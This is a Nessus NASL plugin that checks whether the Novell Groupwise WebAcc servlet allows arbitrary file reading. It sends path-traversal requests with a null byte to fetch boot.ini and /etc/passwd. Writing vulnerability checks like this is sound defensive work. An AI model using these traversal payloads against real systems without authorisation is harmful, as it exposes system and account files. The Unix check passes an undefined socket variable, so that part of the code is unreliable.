#
# Copyright 2001 by Noam Rathaus <noamr@securiteam.com>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# See the Nessus Scripts License for details
#
#

if(description)
{
 script_id(10789); 
 script_version ("$Revision: 1.7 $");
 script_bugtraq_id(3436);

 name["english"] = "Novell Groupwise WebAcc Information Disclosure";
 script_name(english:name["english"]);

 desc["english"] = "
Novell Groupwise WebAcc Servlet is installed. This servlet exposes 
critical system information, and allows remote attackers to read any file.

Solution: Disable access to the servlet until the author releases a patch.
Risk factor : High

Additional information:
http://www.securiteam.com/securitynews/6S00N0K2UM.html";

 script_description(english:desc["english"]);

 summary["english"] = "Novell Groupwise WebAcc Information Disclosure";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2001 SecuriTeam");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);

 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_kb_item("Services/www");
if(!port)port = 80;

if(!get_port_state(port))exit(0);


url = string("/servlet/webacc");
installed = is_cgi_installed_ka(port:port, item:url);
if (installed)
{
# test NT systems
req = string("GET /servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../boot.ini%00 HTTP/1.0\r\n");
req = string(req, "User-Agent: Mozilla/7 [en] (X11; U; Linux 2.6.1 ia64)\r\n");
req = string(req, "Host: ", get_host_name(), "\r\n\r\n");

buf = http_keepalive_send_recv(port:port, data:req);
if( buf == NULL ) exit(0);
   
if ("[boot loader]" >< buf)
{
  security_hole(port:port);
  exit(0);
}


# test unix systems
req = string("GET /servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.0\r\n");
req = string(req, "User-Agent: Mozilla/7 [en] (X11; U; Linux 2.6.1 ia64)\r\n");
req = string(req, "Host: ", get_host_name(), "\r\n\r\n");
buf = http_keepalive_send_recv(socket:soc, data:req);
if( buf == NULL ) exit(0);

if (egrep(pattern:"root:0:[01]:.*", string:buf))
  {
   security_hole(port:port);
   exit(0);
  }
  if("File does not exist" >< buf)
  {
   security_note(port:port);
  }
}

